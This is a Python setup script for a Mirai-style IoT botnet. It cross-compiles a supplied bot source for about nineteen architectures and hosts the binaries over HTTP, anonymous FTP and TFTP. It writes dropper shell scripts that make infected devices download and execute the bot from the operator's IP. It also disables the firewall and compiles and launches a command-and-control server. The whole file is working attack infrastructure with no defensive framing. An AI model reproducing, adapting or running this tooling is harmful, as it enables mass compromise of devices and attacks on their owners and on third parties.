import subprocess, sys

if len(sys.argv) < 3:
    print("\x1b[0;32mUsage: python3 " + sys.argv[0] + " bot.c 1.2.3.4 \x1b[0m")
    exit(1)

bot = sys.argv[1]
ip = sys.argv[2]

def system(cmd):
    subprocess.call(cmd, shell=True)

botport = "4444"
threads = "800"
cncport = "1337"

archnames = [
    "windy.arm4", "windy.arm4t", "windy.arm5", "windy.arm6",
    "windy.i686", "windy.m68", "windy.mips", "windy.mpsl",
    "windy.ppc", "windy.spc", "windy.x86", "windy.sh4",
    "windy.arm7", "windy.arm64", "windy.riscv64",
    "windy.riscv32", "windy.mips64", "windy.mpsl64", "windy.loong64"
]

getarch = [
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4tl.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-aarch64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-riscv64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-riscv32.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-loongarch64.tar.bz2"
]

compilers = [
    "cross-compiler-armv4l", "cross-compiler-armv4tl",
    "cross-compiler-armv5l", "cross-compiler-armv6l",
    "cross-compiler-i686", "cross-compiler-m68k",
    "cross-compiler-mips", "cross-compiler-mipsel",
    "cross-compiler-powerpc", "cross-compiler-sparc",
    "cross-compiler-x86_64", "cross-compiler-sh4",
    "cross-compiler-armv7l", "cross-compiler-aarch64",
    "cross-compiler-riscv64", "cross-compiler-riscv32",
    "cross-compiler-mips64", "cross-compiler-mipsel64",
    "cross-compiler-loongarch64"
]

update_server = input("Update Server? Y/n: ")
if update_server.lower() == "y":
    print("Updating Server")
    system("sudo apt update -y")

depends = input("Install Dependencies? Y/n: ")
if depends.lower() == "y":
    print("Installing Dependencies")
    system("sudo apt install perl gcc* bzip2 g++ cpan httpd tftp screen nano unzip tar busybox python3-paramiko -y")

download = input("Download Cross Compilers? Y/n: ")
if download.lower() == "y":
    system("rm -rf cross-compiler-*")
    print("Downloading Architectures")
    for arch in getarch:
        system("wget " + arch + " --no-check-certificate -q")
        system("tar -xf *tar.bz2")
        system("rm -f *tar.bz2")
    print("Cross Compilers Downloaded...")

system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

# Compile binaries
for num, cc in enumerate(compilers):
    arch = cc.split("-")[2]
    output = archnames[num]
    system(f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {output} {bot} > /dev/null 2>&1")

# Setup services
system("sudo apt install httpd xinetd tftp tftp-server vsftpd -y")
system("service httpd start")
system("service vsftpd start")

system('''echo -e "service tftp
{
    socket_type     = dgram
    protocol        = udp
    wait            = yes
    user            = root
    server          = /usr/sbin/in.tftpd
    server_args     = -s -c /var/lib/tftpboot
    disable         = no
    per_source      = 11
    cps             = 100 2
    flags           = IPv4
}" > /etc/xinetd.d/tftp''')

system("service xinetd start")

system(f'''echo -e "listen=YES
anonymous_enable=YES
anon_root=/var/ftp
listen_address={ip}
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')

system("service vsftpd restart")

# Generate dropper scripts
system('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
for i in archnames:
    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}" >> /var/www/html/bins.sh')

for i in archnames:
    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i}; ./{i}; rm -rf {i}" >> /var/ftp/ftp1.sh')

system('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp1.sh')
for i in archnames:
    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get {i}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp1.sh')

system('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp2.sh')
for i in archnames:
    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r {i} -g {ip}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp2.sh')

# Move payloads
for i in archnames:
    system(f"cp {i} /var/www/html")
    system(f"cp {i} /var/ftp")
    system(f"mv {i} /var/lib/tftpboot")

# Ulimit + iptables
print("Disabling Iptables & Increasing Limits")
system("service iptables stop || true")
system("chkconfig iptables off || true")
system("ulimit -n 999999; ulimit -u 999999")
system("sysctl -w fs.file-max=999999")
system('echo "ulimit -n 999999" >> ~/.bashrc')
system('echo "ulimit -u 999999" >> ~/.bashrc')

# Final Dropper Output
system(f'''echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
wget http://{ip}/bins.sh; chmod 777 bins.sh; sh bins.sh;
tftp {ip} -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh;
tftp -r tftp2.sh -g {ip}; chmod 777 tftp2.sh; sh tftp2.sh;
ftpget -v -u anonymous -p anonymous -P 21 {ip} ftp1.sh ftp1.sh; sh ftp1.sh;
rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> ~/net/wget.txt''')

compile_cnc = input("Cross Compile C&C And Screen It? Y/n: ")
if compile_cnc.lower() == "y":
    print("Compiling C&C")
    system("service iptables stop || true")
    system(f"cd ~/net; gcc cnc.c -o cnc -pthread")
    system(f"cd ~/net; screen -dmS cnc ./cnc {botport} {threads} {cncport}")

print("Finished.")
